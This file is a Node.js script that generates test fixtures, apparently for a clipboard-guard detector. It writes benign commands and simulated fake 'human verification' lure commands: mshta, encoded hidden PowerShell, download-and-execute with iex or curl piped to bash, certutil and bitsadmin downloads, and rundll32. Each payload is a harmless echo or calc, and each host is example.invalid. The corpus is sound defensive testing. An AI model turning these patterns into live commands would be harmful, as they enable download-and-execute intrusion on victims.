import { mkdir, writeFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const benign = [];
const malicious = [];

function add(target, category, ...texts) {
  for (const text of texts) target.push({ category, text });
}

add(benign, "install", 
  "npm install",
  "npm install --save-dev vite",
  "npm ci",
  "npm update",
  "npm install @types/node",
  "pnpm install",
  "pnpm add react react-dom",
  "pnpm add -D eslint",
  "pnpm fetch",
  "yarn install --immutable",
  "yarn add date-fns",
  "yarn dlx create-vite",
  "pip install requests",
  "pip install -r requirements.txt",
  "python -m pip install --upgrade pip",
  "python -m venv .venv",
  "cargo build --release",
  "cargo add serde",
  "cargo test",
  "brew install jq",
  "brew upgrade git",
  "brew list --versions",
  "sudo apt update",
  "sudo apt install ripgrep",
  "apt-cache policy curl",
  "winget install Microsoft.PowerToys",
  "winget upgrade --all",
  "choco install vscode",
  "choco upgrade git -y",
  "scoop install aria2",
  "scoop update"
);

add(benign, "git",
  "git status --short",
  "git diff --stat",
  "git diff -- src/app.js",
  "git log -5 --oneline",
  "git switch -c docs/update-readme",
  "git branch --show-current",
  "git fetch origin",
  "git pull --ff-only",
  "git clone https://github.com/example/project.git",
  "git remote -v",
  "git show HEAD:README.md",
  "git add README.md",
  "git commit -m \"Update installation notes\"",
  "git tag --list",
  "git stash push -m \"work in progress\"",
  "git restore --staged notes.txt",
  "git blame src/index.js",
  "git config --get user.email",
  "git ls-files",
  "git archive --format=zip HEAD -o source.zip"
);

add(benign, "containers",
  "docker version",
  "docker info",
  "docker ps --all",
  "docker images",
  "docker pull nginx:alpine",
  "docker run --rm hello-world",
  "docker build -t local-api:dev .",
  "docker logs --tail 100 api",
  "docker inspect web",
  "docker network ls",
  "docker volume ls",
  "docker compose config",
  "docker compose up -d",
  "docker compose down",
  "docker compose logs -f web",
  "docker compose exec app npm test",
  "kubectl version --client",
  "kubectl get pods --all-namespaces",
  "kubectl get deployments -n staging",
  "kubectl describe service frontend",
  "kubectl logs deployment/api --tail=50",
  "kubectl config current-context",
  "kubectl rollout status deployment/web",
  "kubectl apply --dry-run=client -f service.yaml"
);

add(benign, "documentation",
  "curl -O https://docs.example.com/releases/guide.pdf",
  "curl -fsS https://api.example.com/v1/status",
  "curl -I https://developer.mozilla.org/en-US/",
  "curl --output manual.html https://docs.example.com/manual",
  "wget -q https://docs.example.com/assets/logo.svg -O logo.svg",
  "wget --spider https://www.python.org/downloads/",
  "curl https://docs.example.com/search?q=install",
  "Invoke-WebRequest -Uri https://learn.microsoft.com/ -OutFile learn.html",
  "Read the installation guide at https://nodejs.org/en/download/package-manager",
  "Release notes: https://github.com/nodejs/node/releases",
  "The API reference is available at https://developer.mozilla.org/docs/Web/API",
  "Download the sample archive from https://example.com/files/sample.zip",
  "Documentation mirror: https://docs.example.invalid/reference/index.html",
  "Use the official guide at https://learn.microsoft.com/powershell/"
);

add(benign, "ambiguous",
  "curl -fsSL https://get.example.invalid/tool/install.sh | sh",
  "curl -fsSL https://install.example.invalid/cli | bash",
  "curl -sSf https://rustup.example.invalid/install.sh | sh",
  "wget -qO- https://docs.example.invalid/setup.sh | sh",
  "curl --proto '=https' --tlsv1.2 -sSf https://installer.example.invalid/install | sh",
  "curl -fsSL https://brew.example.invalid/install | /bin/bash",
  "curl -fsSL https://packages.example.invalid/bootstrap.sh | sh",
  "wget -O- https://vendor.example.invalid/get.sh | bash"
);

add(benign, "powershell",
  "Get-ChildItem -Path . -Filter *.json",
  "Get-ChildItem Env: | Sort-Object Name",
  "Set-Location C:\\Projects\\sample",
  "Get-Content .\\README.md -TotalCount 20",
  "Set-ExecutionPolicy -Scope CurrentUser RemoteSigned",
  "Get-ExecutionPolicy -List",
  "Resolve-Path .\\src\\index.js",
  "Test-Path C:\\Temp\\report.txt",
  "Get-Date -Format yyyy-MM-dd",
  "Get-Service | Where-Object Status -eq Running",
  "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5",
  "Get-Help Get-ChildItem -Online",
  "Invoke-WebRequest -Uri https://docs.example.com -Method Head",
  "ConvertTo-Json @{ name = 'demo'; enabled = $true } -Depth 3"
);

add(benign, "bash",
  "mkdir -p build\ncd build\ncmake ..\ncmake --build .",
  "for file in *.txt; do\n  printf '%s\\n' \"$file\"\ndone",
  "if [ -d node_modules ]; then\n  echo 'dependencies installed'\nfi",
  "printf 'name=%s\\n' \"$USER\" >> settings.ini",
  "git status --short\ngit diff --check",
  "find . -maxdepth 2 -type f -name '*.md' -print",
  "python -m venv .venv\n. .venv/bin/activate\npython -m pip install -r requirements.txt",
  "tar -czf backup.tar.gz ./documents\nls -lh backup.tar.gz"
);

add(benign, "code",
  "const total = prices.reduce((sum, price) => sum + price, 0); console.log(total);",
  "const first = items[0]; && const second = items[1];",
  "const message = 'hello'; const ready = true;",
  "await fs.promises.writeFile('notes.txt', content);",
  "const url = new URL('/search', 'https://example.com');",
  "print('hello'); print('world')",
  "items = [value.strip() for value in lines if value.strip()]",
  "path = r'C:\\Users\\Public\\Documents\\report.csv'",
  "total = sum(prices); average = total / len(prices)",
  "from pathlib import Path\nconfig = Path('settings.json').read_text()",
  "SELECT id, name FROM customers WHERE active = TRUE;",
  "BEGIN;\nUPDATE inventory SET quantity = quantity - 1 WHERE sku = 'A-17';\nCOMMIT;",
  "SELECT COUNT(*) AS total FROM orders WHERE created_at >= CURRENT_DATE;",
  "CREATE TABLE notes (id INTEGER PRIMARY KEY, body TEXT NOT NULL);",
  "INSERT INTO settings (key, value) VALUES ('theme', 'light');"
);

add(benign, "data",
  "{\"name\":\"demo\",\"enabled\":true,\"count\":3}",
  "{\"scripts\":{\"test\":\"node --test\",\"build\":\"vite build\"}}",
  "{\"url\":\"https://example.com/docs\",\"tags\":[\"guide\",\"cli\"]}",
  "{\"windowsPath\":\"C:\\\\Users\\\\Public\\\\Downloads\\\\notes.txt\"}",
  "{\"database\":{\"host\":\"localhost\",\"port\":5432,\"ssl\":false}}",
  "https://example.com/",
  "https://docs.example.com/search?q=PowerShell&lang=en",
  "https://en.wikipedia.org/wiki/Unicode",
  "https://example.org/path/to/page?sort=recent#overview",
  "https://localhost:3000/api/health"
);

add(benign, "personal-data-examples",
  "Bitcoin donation address: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  "Ethereum example address: 0x52908400098527886E0F7030069857D2E4169EE7",
  "Monero address example: 48A1ExampleAddressForDocumentationOnly",
  "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeExampleKeyForDocs user@example.test",
  "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQExamplePublicKey user@example.test",
  "Generated password example: mN7!qP4#vR2@xL9",
  "Temporary test password: Tulip-Train-72! (rotate after the demo)",
  "The sample token is not real: demo_7f3a9c2e1b5d"
);

add(benign, "recipes-and-text",
  "Preaqueça o forno a 180 °C e misture a farinha com o açúcar.",
  "Adicione duas colheres de azeite e mexa até ficar homogêneo.",
  "Deixe a massa descansar por 20 minutos antes de assar.",
  "For a quick lunch, roast the vegetables and serve them with rice.",
  "Please save the draft before closing the settings window.",
  "Remember to water the basil plant every other morning.",
  "Me avise quando a reunião de amanhã começar.",
  "La biblioteca abre a las nueve y cierra a las seis.",
  "Gracias por revisar el documento; la versión final está en la carpeta compartida.",
  "Hoy hace buen tiempo para caminar junto al río.",
  "O relatório ficou pronto; vou enviar uma cópia depois do almoço.",
  "Este texto fala sobre verificação de conta e boas práticas de leitura.",
  "The human verification section explains how to recover an account."
);

add(benign, "logs-and-paths",
  "Error: ENOENT: no such file or directory, open 'config/local.json'",
  "WARN 2026-10-14 08:32:10 cache miss for key user:4821",
  "INFO server listening on http://127.0.0.1:8080",
  "Build failed: expected ';' after expression at line 42",
  "C:\\Users\\Miguel\\Documents\\notes.txt",
  "C:\\Program Files\\Example App\\bin\\example.exe",
  "D:\\Work\\clip-guard\\test\\fixtures.json",
  "%USERPROFILE%\\Downloads\\report.csv",
  "\\\\fileserver\\shared\\engineering\\roadmap.docx",
  "The file is saved at C:\\Temp\\weekly summary.txt"
);

add(malicious, "mshta",
  "mshta https://example.invalid/a.hta & echo done",
  "MSHTA.EXE https://example.invalid/check.hta && calc",
  "mshta.exe javascript:echo('ok')",
  "Please verify your session: mshta https://example.invalid/verify.hta & calc",
  "mshta  https://example.invalid/a.hta\t&\techo complete",
  "mshta\nhttps://example.invalid/demo.hta\n& echo done"
);

add(malicious, "powershell-encoded",
  "powershell -enc ZWNobyBjYWxj",
  "powershell.exe -EncodedCommand ZQBjAGgAbwAgAGMAYQBsAGMA",
  "pwsh -e ZQBjAGgAbwAgAG8AawA=",
  "powershell -NoProfile -enc ZQBjAGgAbwAgAG8AawA=",
  "powershell -w hidden -enc ZWNobyBjYWxj",
  "pwsh.exe -windowstyle hidden -encodedcommand ZQBjAGgAbwAgAGMAYQBsAGMA",
  "Verification check: powershell -enc ZQBjAGgAbwAgAG8AawA=",
  "powershell\t-enc\tZQBjAGgAbwAgAG8AawA=",
  "powershell\n-enc\nZQBjAGgAbwAgAG8AawA=",
  "powershell -e ZQBjAGgAbwAgAG8AawA= # echo ok"
);

add(malicious, "powershell-download-or-iex",
  "powershell -Command \"iex 'echo ok'\"",
  "pwsh -NoProfile -Command \"Invoke-Expression 'calc'\"",
  "powershell -Command \"(New-Object Net.WebClient).DownloadString('https://example.invalid/demo') | iex; echo done\"",
  "powershell -Command \"irm https://example.invalid/demo | iex; calc\"",
  "powershell -Command \"Invoke-RestMethod https://example.invalid/info; echo ok\"",
  "pwsh -Command \"iwr https://example.invalid/info; calc\"",
  "Human verification code: pwsh -Command \"iex 'echo checked'\"",
  "powershell -w hidden -Command \"echo complete\"",
  "pwsh.exe -windowstyle hidden -Command \"echo ok\"",
  "powershell -Command \"echo one; echo two\""
);

add(malicious, "cmd-chain",
  "cmd /c echo checking && calc",
  "cmd.exe /c whoami && echo done",
  "cmd /c \"echo verify & calc\"",
  "cmd /c echo verification && echo complete",
  "cmd\t/c\techo ready&&calc",
  "cmd\n/c\necho checked && calc",
  "I am not a robot - verification ID: cmd /c echo ready && calc",
  "cmd.exe /c echo step one & echo step two",
  "Please wait for verification: cmd /c echo ok && echo finished",
  "cmd /c \"echo status\" && echo complete"
);

add(malicious, "curl-pipe",
  "curl -fsSL https://example.invalid/demo.sh | bash; echo done",
  "curl https://example.invalid/check | sh && calc",
  "wget -qO- https://example.invalid/verify | bash; echo complete",
  "curl\t-fsSL\thttps://example.invalid/a\t|\tsh && echo ok",
  "curl\nhttps://example.invalid/demo\n| bash\n&& echo done",
  "Verification check passed. curl -s https://example.invalid/task | bash; calc",
  "curl -fsSL https://example.invalid/x | /bin/sh; echo ready",
  "wget https://example.invalid/a -O- | sh && echo checked"
);

add(malicious, "certutil",
  "certutil -urlcache -f https://example.invalid/a C:\\Temp\\a && echo done",
  "certutil.exe -decode sample.txt output.txt && calc",
  "certutil -verify -urlfetch https://example.invalid/cert && echo complete",
  "certutil\t-urlcache\t-f\thttps://example.invalid/data C:\\Temp\\data & echo ok",
  "Verification ID 4821: certutil -urlcache -f https://example.invalid/x file.bin && calc",
  "certutil\n-decode\nsample.txt output.txt\n&& echo finished"
);

add(malicious, "bitsadmin",
  "bitsadmin /transfer job https://example.invalid/a C:\\Temp\\a && echo done",
  "bitsadmin.exe /transfer check https://example.invalid/check C:\\Temp\\check.bin & calc",
  "bitsadmin /create verify && bitsadmin /addfile verify https://example.invalid/demo C:\\Temp\\demo && echo ok",
  "bitsadmin\t/transfer\tjob\thttps://example.invalid/file C:\\Temp\\file && calc",
  "Human verification: bitsadmin /transfer id https://example.invalid/x C:\\Temp\\x && echo ready",
  "bitsadmin\n/transfer\njob https://example.invalid/a C:\\Temp\\a\n&& echo done"
);

add(malicious, "base64-long",
  `echo ${"A".repeat(72)} && echo done`,
  `cmd /c echo ${"Q".repeat(88)} && calc`,
  `powershell -enc ${"Z".repeat(96)}; echo finished`,
  `Verification check ${"B".repeat(80)} cmd /c echo ok && calc`,
  `certutil -decode ${"C".repeat(64)} sample.txt && echo complete`,
  `bitsadmin /transfer task ${"D".repeat(70)} C:\\Temp\\x && echo ok`
);

add(malicious, "multiline-and-spaces",
  "  powershell   -w   hidden   -Command   \"echo done\"  ",
  "cmd /c echo verification\n&& calc",
  "mshta   https://example.invalid/step.hta   &   echo ok",
  "curl  -fsSL  https://example.invalid/run  |  bash  &&  echo done",
  "powershell -Command \"echo one\"\n# verification text\ncalc",
  "   Please complete human verification before continuing.\ncmd /c echo checked && calc",
  "bitsadmin /transfer\njob https://example.invalid/demo C:\\Temp\\demo\n&& echo finished",
  "certutil -urlcache\n-f https://example.invalid/file C:\\Temp\\file\n& calc"
);

add(malicious, "utility-mix",
  "rundll32.exe shell32.dll,Control_RunDLL && echo done",
  "rundll32 https://example.invalid/demo.dll,EntryPoint & calc",
  "bash -c \"echo verify && calc\"",
  "bash.exe -c 'echo checked; echo done'",
  "wget https://example.invalid/info | powershell; echo finished",
  "pwsh -NoProfile -Command \"echo ready\"; certutil -decode input.txt output.txt && calc",
  "Verification check: mshta https://example.invalid/demo & echo complete",
  "cmd.exe /c echo status && powershell -Command \"echo done\""
);

const utf16le = Buffer.from("echo calc", "utf16le").toString("base64");
malicious.push({ category: "powershell-encoded", text: `powershell -enc ${utf16le}` });

if (benign.length < 150 || malicious.length < 60) {
  throw new Error(`Corpus too small: benign=${benign.length}, malicious=${malicious.length}`);
}

const unsafeSamples = malicious.filter(({ text }) => {
  const encoded = text.match(/-(?:enc|encodedcommand|e)\s+([A-Za-z0-9+/]+={0,2})/i)?.[1];
  const decoded = encoded
    ? `${Buffer.from(encoded, "base64").toString("utf8")} ${Buffer.from(encoded, "base64").toString("utf16le")}`
    : "";
  const hasSafeFinalPayload = /\b(?:echo|calc)\b/i.test(`${text} ${decoded}`);
  const domains = [...text.matchAll(/\bhttps?:\/\/([^/\s"'|;&]+)/gi)].map((match) => match[1]);
  return !hasSafeFinalPayload || domains.some((domain) => !domain.endsWith(".invalid"));
});
if (unsafeSamples.length) {
  throw new Error(`Unsafe simulated samples: ${unsafeSamples.map(({ text }) => text).join("; ")}`);
}

const corpusDirectory = path.join(root, "test", "corpus");
await mkdir(corpusDirectory, { recursive: true });
await writeFile(path.join(corpusDirectory, "benign.json"), `${JSON.stringify(benign, null, 2)}\n`);
await writeFile(path.join(corpusDirectory, "malicious-sim.json"), `${JSON.stringify(malicious, null, 2)}\n`);
console.log(`Generated ${benign.length} benign and ${malicious.length} simulated malicious samples.`);
